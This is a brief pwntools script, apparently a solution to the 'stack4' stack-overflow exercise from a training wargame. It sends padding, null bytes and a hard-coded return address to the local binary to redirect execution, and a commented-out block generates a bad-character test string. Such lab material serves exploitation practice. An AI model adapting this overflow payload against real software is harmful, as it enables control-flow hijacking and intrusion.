#!/usr/bin/python

from pwn import *
import os

context(arch='i386', os='linux')
binary = './stack4'

"""
payload = b""
excluded = (0xa,0x1a)
for i in range(256):
	if i not in excluded:
		payload +=  bytes([i])

"""
payload = "A"*88 + "\x00"*4 + "\xC5\x84\x04\x08"

elf = ELF(binary)

proc2 = process(binary)
info("send payload?")
pause()
proc2.sendline(payload)
r = proc2.recvline()
#r += proc2.recvline()
print(r)
proc2.wait()
proc2.close()


